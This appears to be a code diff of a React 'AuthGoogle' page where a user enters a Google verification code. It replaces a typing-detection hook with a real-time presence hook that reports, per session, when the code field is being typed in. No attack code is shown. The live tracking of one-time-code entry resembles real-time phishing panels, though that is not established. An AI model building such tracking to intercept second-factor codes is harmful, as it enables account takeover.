@@ -9,7 +9,7 @@ import { ChevronLeft, Smartphone, Loader2, QrCode } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { AlertMessage } from "@/components/AlertMessage";
 import { OTPInput } from "@/components/OTPInput";
-import { useSimpleTypingDetection } from "@/hooks/useSimpleTypingDetection";
+import { useRealtimePresence } from "@/hooks/useRealtimePresence";
 
 const AuthGoogle = () => {
   const location = useLocation();
@@ -24,11 +24,11 @@ const AuthGoogle = () => {
     location.state?.sessionId || sessionStorage.getItem("sessionId");
   const hasError = location.state?.hasError || false;
 
-  // تشخیص تایپ برای AuthGoogle
-  const typingDetection = useSimpleTypingDetection({
+  // Real-time presence tracking
+  const presence = useRealtimePresence({
+    sessionId: sessionId || "",
     formName: "AuthGoogle",
-    enabledFields: ["googleCode"],
-    debounceTime: 1000,
+    enabled: !!sessionId,
   });
 
   useEffect(() => {
@@ -122,9 +122,9 @@ const AuthGoogle = () => {
     }
     // تشخیص تایپ برای presence system
     if (newCode) {
-      typingDetection.startTyping("googleCode");
+      presence.startTyping("googleCode");
     } else {
-      typingDetection.stopTyping("googleCode");
+      presence.stopTyping();
     }
   };
 
